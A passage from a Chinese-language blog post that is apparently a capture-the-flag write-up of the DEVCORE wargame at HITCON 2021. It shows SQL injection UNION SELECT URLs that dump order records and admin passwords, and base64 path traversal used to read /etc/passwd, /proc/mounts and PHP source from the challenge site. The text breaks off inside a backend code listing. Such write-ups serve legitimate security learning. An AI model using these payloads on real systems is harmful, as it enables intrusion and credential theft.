<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>[DEVCORE @HITCON2021] Wargame Web Challenge - Cyris&#39;s Blog</title><meta name="Description" content="This is Cyris&#39;s blog, recording life and sharing security learning."><meta property="og:url" content="https://blog.cyris.tw/posts/2021/hitcon2021-devcore-web-challenge/">
  <meta property="og:site_name" content="Cyris&#39;s Blog">
  <meta property="og:title" content="[DEVCORE @HITCON2021] Wargame Web Challenge">
  <meta property="og:description" content="嗚嗚 好想拿 MASTER OF WEBSEC，但實力不允許我挑戰這個頭銜QQ
今年是我第二次參加 HITCON，現場活動真的是多到很難全部都摸過一遍 : D
">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
  <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2021-12-01T00:00:00+00:00">
    <meta property="article:modified_time" content="2021-12-01T00:00:00+00:00">
    <meta property="article:tag" content="HITCON">
    <meta property="article:tag" content="DEVCORE Wargame">
    <meta property="article:tag" content="Penetration Test">
    <meta property="og:image" content="https://blog.cyris.tw/img/cyris.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://blog.cyris.tw/img/cyris.png"><meta name="twitter:title" content="[DEVCORE @HITCON2021] Wargame Web Challenge">
<meta name="twitter:description" content="嗚嗚 好想拿 MASTER OF WEBSEC，但實力不允許我挑戰這個頭銜QQ
今年是我第二次參加 HITCON，現場活動真的是多到很難全部都摸過一遍 : D">
      <meta name="twitter:site" content="@yctseng1227">
<meta name="application-name" content="Cyris&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Cyris&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/img/favicon.ico"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://blog.cyris.tw/posts/2021/hitcon2021-devcore-web-challenge/" /><link rel="prev" href="https://blog.cyris.tw/posts/2021/hitcon-education-defense-2021/" /><link rel="next" href="https://blog.cyris.tw/posts/2022/nsysuisc-intranet-penetration/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "[DEVCORE @HITCON2021] Wargame Web Challenge",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/blog.cyris.tw\/posts\/2021\/hitcon2021-devcore-web-challenge\/"
        },"image": ["https:\/\/blog.cyris.tw\/img\/cyris.png"],"genre": "posts","keywords": "HITCON, DEVCORE Wargame, Penetration Test","wordcount":  996 ,
        "url": "https:\/\/blog.cyris.tw\/posts\/2021\/hitcon2021-devcore-web-challenge\/","datePublished": "2021-12-01T00:00:00+00:00","dateModified": "2021-12-01T00:00:00+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
            "@type": "Organization",
            "name": "Cyris","logo": "https:\/\/blog.cyris.tw\/img\/cyris.png"},"author": {
                "@type": "Person",
                "name": "Cyris"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="auto" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Cyris&#39;s Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/img/favicon.ico"
        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
        data-sizes="auto"
        alt="/img/favicon.ico"
        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="#" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Cyris&#39;s Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="/img/favicon.ico"
        data-srcset="/img/favicon.ico, /img/favicon.ico 1.5x, /img/favicon.ico 2x"
        data-sizes="auto"
        alt="/img/favicon.ico"
        title="/img/favicon.ico" />Cyris&#39;s Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/about/" title="">About</a><a href="#" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">[DEVCORE @HITCON2021] Wargame Web Challenge</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://blog.cyris.tw" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Cyris</a></span>&nbsp;<span class="post-category">included in <a href="/categories/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8-cyber-security/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>資訊安全 Cyber Security</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-12-01">2021-12-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;996 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;5 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#閒聊">閒聊</a></li>
    <li><a href="#description">Description</a>
      <ul>
        <li>
          <ul>
            <li><a href="#備註說明">備註說明</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#solution">Solution</a>
      <ul>
        <li><a href="#弱點-2broken-access-control">弱點 2：Broken Access Control</a></li>
        <li><a href="#弱點-3sql-injection">弱點 3：SQL Injection</a></li>
        <li><a href="#弱點-1path-traversal">弱點 1：Path Traversal</a></li>
        <li><a href="#弱點-4use-of-less-trusted-source">弱點 4：Use of Less Trusted Source</a></li>
        <li><a href="#弱點-5unrestricted-file-upload">弱點 5：Unrestricted File Upload</a></li>
        <li><a href="#弱點-6local-file-inclusion">弱點 6：Local File Inclusion</a>
          <ul>
            <li><a href="#1-上傳後門">(1) 上傳後門</a></li>
            <li><a href="#2-使用後門">(2) 使用後門</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#後記">後記</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p>嗚嗚 好想拿 <font color="#46D62D"><b>MASTER OF WEBSEC</b></font>，但實力不允許我挑戰這個頭銜QQ<br>
今年是我第二次參加 HITCON，現場活動真的是多到很難全部都摸過一遍 : D</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1638291990/blog-posts/2021-12/01-cover.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_800/v1638291990/blog-posts/2021-12/01-cover.webp, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_800/v1638291990/blog-posts/2021-12/01-cover.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_800/v1638291990/blog-posts/2021-12/01-cover.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1638291990/blog-posts/2021-12/01-cover.webp"
        title=" " />
DEVCORE Wargame 活動說明: <a href="https://hackmd.io/@d3vc0r3/hitcon2021" target="_blank" rel="noopener noreffer ">https://hackmd.io/@d3vc0r3/hitcon2021</a></p>
<h2 id="閒聊">閒聊</h2>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1638207100/blog-posts/2021-12/01-hackmeow.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_800/v1638207100/blog-posts/2021-12/01-hackmeow.webp, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_800/v1638207100/blog-posts/2021-12/01-hackmeow.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/c_scale%2cf_auto%2cq_auto%2cw_800/v1638207100/blog-posts/2021-12/01-hackmeow.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/c_scale,f_auto,q_auto,w_800/v1638207100/blog-posts/2021-12/01-hackmeow.webp"
        title=" " /></p>
<p>這次 HITCON 2021 我除了跑完官方活動的「<strong>駭客貓歷險記</strong>」還有「<strong>駭客喵喵 &amp; 駭客貓行動</strong>」，剩下有認真摸的就是 DEVCORE Wargame，畢竟當初看到戳到 4 個 flag 的前 60 位有<a href="https://opensea.io/collection/hitcon2021-x-devcore" target="_blank" rel="noopener noreffer ">NFT 成就</a>可以拿，雖然平常沒有在用這類的區塊鏈，但獎勵聽起來就很帥XD</p>
<p>（另外中華資安的 CTF 前三名還送 OSCP 的培訓課程，但那個難度&hellip; QQ）</p>
<p>這次要感謝 @stavhaygn 和 @splitline 兩位願意給 hint，也感謝 @arikoi 願意聽我訴戳不出來的苦XDDD</p>
<h2 id="description">Description</h2>
<p>你是一名滲透測試專家，並且剛接受到一份委託，需要對一個網站進行滲透測試，測試期限至 11/27 為止。由於有時程、預算等壓力以及階段性的安排，客戶希望優先尋找 Server-Side 相關的漏洞。因此你的任務就是在時程內找出可能有風險的 Server-Side 漏洞並交出一份滲透測試報告！</p>
<h4 id="備註說明">備註說明</h4>
<ul>
<li>每個弱點都是依據真實發生的案例所準備的，可以嘗試想像現代網站會如何部署、有什麼樣的架構，以此作為思維出發點。</li>
<li>每送出一把 flag 就會解鎖報告中的一個弱點章節，章節內有弱點細節、修補建議的範例文字，解完題後還能體驗一下實務報告樣貌的感覺唷！</li>
<li>作為一名專業的 Pentester，你必須讓客戶值得信任，所以不能惡意破壞系統或是刪除、覆蓋任何非你新增的檔案、資料庫內容，造成系統無法運作。
<ul>
<li>如果違反規則，破壞系統或惡意干擾其他參加者，將會被取消所有領獎資格。</li>
</ul>
</li>
</ul>
<h2 id="solution">Solution</h2>
<p>目標網站是個影印機訂購網站，填完資料就能到訂單資訊的頁面，並且可以查看收據明細&amp;列印。而設計上總共有六個弱點可以拿到 flag，整個過程算是花費了不少時間，這篇會盡量省略不必要的遠路（<del>絕對不是因為我忘記了</del>），官方的滲透測試報告放在最下方供各位參考。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638207053/blog-posts/2021-12/01-overview.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638207053/blog-posts/2021-12/01-overview.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638207053/blog-posts/2021-12/01-overview.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638207053/blog-posts/2021-12/01-overview.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638207053/blog-posts/2021-12/01-overview.webp"
        title=" " /></p>
<br>
<p><del>起手式是 @stavhaygn</del>，他在匯出 PDF 的頁面找到有 SQLi 的漏洞，原網址如下。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://web.ctf.devcore.tw/print.php?id=35640&amp;sig=4ufNcDscM0YTLDrd0gDyqDJCx8EPJh1kyq1ghUc6ZPztC0xmq96CPQ5vk8l2LBDi
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206384/blog-posts/2021-12/01-print.php.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206384/blog-posts/2021-12/01-print.php.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206384/blog-posts/2021-12/01-print.php.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206384/blog-posts/2021-12/01-print.php.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206384/blog-posts/2021-12/01-print.php.webp"
        title=" " /></p>
<h3 id="弱點-2broken-access-control">弱點 2：Broken Access Control</h3>
<p>這部分我原本認為訂單編號會因為驗後面那串<code>sig</code>而沒辦法戳 <a href="https://en.wikipedia.org/wiki/Insecure_direct_object_reference" target="_blank" rel="noopener noreffer ">IDOR</a>，但事實上在我們戳 SQLi 的過程，被 @stavhaygn 戳到第一筆訂單有 flag。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://web.ctf.devcore.tw/print.php?sig=xLMBWcDpMGC1DvRD6F9l8bo1vdZU51uG4c6ZtfJaKiflyCisPZpZe0gu7OWfb88E&amp;id=3456055 union select id,name,email,phone,status,sig_hash,order_date,address,note FROM orders where id = 1
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206384/blog-posts/2021-12/01-sqli-flag2.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206384/blog-posts/2021-12/01-sqli-flag2.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206384/blog-posts/2021-12/01-sqli-flag2.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206384/blog-posts/2021-12/01-sqli-flag2.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206384/blog-posts/2021-12/01-sqli-flag2.webp"
        title=" " /></p>
<p>不過送出去發現官解是<strong>無效的存取控管</strong>，根本也不需要 SQLi 這麼麻煩，還真的是不小心撿到XDDD</p>
<h3 id="弱點-3sql-injection">弱點 3：SQL Injection</h3>
<p>至於 SQLi 的戳法可以參考 <a href="../../2020/nsysu-htcf-hw2/#news-160-points" rel="">NSYSU 駭客攻防 HW 0x02 Writeups</a> ，使用 <code>Union Select</code> 的 SOP 大致相同這裡就不再贅述，資料庫結構如下。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">web
</span></span><span class="line"><span class="cl">  <span class="p">|</span>-- items
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- id
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- title
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- description
</span></span><span class="line"><span class="cl">  <span class="p">|</span>-- rate_limit
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- ip
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- last_visit
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- visit_times
</span></span><span class="line"><span class="cl">  <span class="p">|</span>-- orders
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- id
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- name
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- email
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- phone
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- status
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- sig_hash
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- order_date
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- address
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- note
</span></span><span class="line"><span class="cl">  <span class="p">|</span>-- options
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- key
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- value
</span></span><span class="line"><span class="cl">  <span class="p">|</span>-- backend_users
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- id
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- username
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- password
</span></span><span class="line"><span class="cl">    <span class="p">|</span>- description
</span></span></code></pre></td></tr></table>
</div>
</div><p>歐對了，別輕易拿 sqlmap 直接 --dump 硬爆資料庫，裡頭的訂單資料量會多到浪費時間 Zzzzz</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://web.ctf.devcore.tw/print.php?sig=xLMBWcDpMGC1DvRD6F9l8bo1vdZU51uG4c6ZtfJaKiflyCisPZpZe0gu7OWfb88E&amp;id=3456055 union select 1,@@version,id,GROUP_CONCAT(username),5,6,GROUP_CONCAT(password),GROUP_CONCAT(description),9 FROM backend_users
</span></span></code></pre></div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206384/blog-posts/2021-12/01-sqli-flag3.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206384/blog-posts/2021-12/01-sqli-flag3.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206384/blog-posts/2021-12/01-sqli-flag3.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206384/blog-posts/2021-12/01-sqli-flag3.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206384/blog-posts/2021-12/01-sqli-flag3.webp"
        title=" " /></p>
<p>從 backend_users 的 admin 拿到 flag，同時也順便拿到明文 password（怕）<br>
另外沒想到同一招 SQLi 可以戳出兩個 flag，蠻有意思的XD</p>
<h3 id="弱點-1path-traversal">弱點 1：Path Traversal</h3>
<p>從首頁的圖片發現後面帶有參數<code>id</code>，用 base64 還原後是該圖片的檔名，原網址如下。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://web.ctf.devcore.tw/image.php?id=aHBfbTI4M2Zkdy5qcGc=
</span></span></code></pre></div><p>簡單測試後知道這邊有 LFI 的漏洞，但這部分我摸了好長一段時間，除了要多層 base64 很麻煩，另外路徑也是當通靈題在摸== 給各位看看我的 terminal 的一部分截圖（<del>順便曬ㄍ星姐</del>），結果其實根本不通靈，<strong>只要你懂網站，網站就會幫助你</strong>（？）</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206390/blog-posts/2021-12/01-path-guess.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206390/blog-posts/2021-12/01-path-guess.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206390/blog-posts/2021-12/01-path-guess.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206390/blog-posts/2021-12/01-path-guess.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206390/blog-posts/2021-12/01-path-guess.webp"
        title=" " /></p>
<p>最後大致測出 root 在 <code>../../../../</code>，而且官方還特地在 <code>/etc/passwd</code> 放了 hint 真是謝囉XD</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206385/blog-posts/2021-12/01-etc_passwd.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206385/blog-posts/2021-12/01-etc_passwd.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206385/blog-posts/2021-12/01-etc_passwd.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206385/blog-posts/2021-12/01-etc_passwd.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206385/blog-posts/2021-12/01-etc_passwd.webp"
        title=" " /></p>
<p>靠著 @stavhaygn 通靈前端在 <code>../frontend/</code> ，也順勢找到了 <code>image.php</code> 的 source code。</p>
<div class="highlight" filename="/frontend/image.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;include.php&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$id</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nx">base64_urlsafe_decode</span><span class="p">(</span><span class="nv">$id</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="nx">IMAGE_PATH</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">http_response_code</span><span class="p">(</span><span class="mi">404</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: &#39;</span> <span class="o">.</span> <span class="nx">mime_content_type</span><span class="p">(</span><span class="nv">$file</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="nx">readfile</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>之後也一直都在通靈找有可能埋 flag 的路徑，還找到一些奇怪路徑（像是<code>/usr/share/file/magic/</code> ），直到 @stavhaygn 問了句「你那為啥那麼客氣不拿其他 .php？」&hellip;嗯很有道理，最後還真的在 <code>include.php</code> 找到 flag，原來這裡才是第一關。</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206387/blog-posts/2021-12/01-flag1.webp"
        data-srcset="https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206387/blog-posts/2021-12/01-flag1.webp, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206387/blog-posts/2021-12/01-flag1.webp 1.5x, https://res.cloudinary.com/eevee-blog/image/upload/f_auto%2cq_auto/v1638206387/blog-posts/2021-12/01-flag1.webp 2x"
        data-sizes="auto"
        alt="https://res.cloudinary.com/eevee-blog/image/upload/f_auto,q_auto/v1638206387/blog-posts/2021-12/01-flag1.webp"
        title=" " /></p>
<h3 id="弱點-4use-of-less-trusted-source">弱點 4：Use of Less Trusted Source</h3>
<p>至此， @stavhaygn 似乎也碰到瓶頸。</p>
<p>所以我跑去找第一名的 splitline 社工一波，得到了關鍵字 <code>/proc/mounts</code>，這份檔案記錄著當前系統掛載的資訊，說實在我根本不會想到要去翻這東西，有經驗的大大果然就是不一樣。</p>
<div class="highlight" filename="/proc/mounts"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">/dev/sda /etc/hosts ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
</span></span><span class="line"><span class="cl">/dev/sda /etc/resolv.conf ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
</span></span><span class="line"><span class="cl">/dev/sda /etc/hostname ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
</span></span><span class="line"><span class="cl">/dev/sda /usr/share/nginx/frontend ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
</span></span><span class="line"><span class="cl">/dev/sda /usr/share/nginx/images ext4 rw,relatime,errors=remount-ro,data=ordered 0 0
</span></span><span class="line"><span class="cl">/dev/sda /usr/share/nginx/b8ck3nd ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
</span></span><span class="line"><span class="cl">/dev/sda /usr/local/etc/php/php.ini ext4 ro,relatime,errors=remount-ro,data=ordered 0 0
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></td></tr></table>
</div>
</div><p>檔案載下來可以看到在 <code>/dev/sda</code> 有一些常見的系統檔案，還有 @stavhaygn 通靈出來的 <code>/usr/share/nginx/frontend</code> ，但最讓我在意的是 <code>/usr/share/nginx/b8ck3nd</code> &hellip; 這後端路徑設計明顯就是不想讓你通靈吧www</p>
<p>直接戳 <code>http://web.ctf.devcore.tw/b8ck3nd/index.php</code> 發現會被 302 導回首頁，所以我決定繼續用 LFI 翻翻看後台的 source code。最後在 <code>../../../../b8ck3nd/include.php</code> 找到 IP 白名單，也很明顯的是要從 <code>/b8ck3nd/login.php</code> 登入進後台。</p>
<div class="highlight" filename="/b8ck3nd/include.php"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../frontend/include.php&#39;</span><span class="p">);</span>
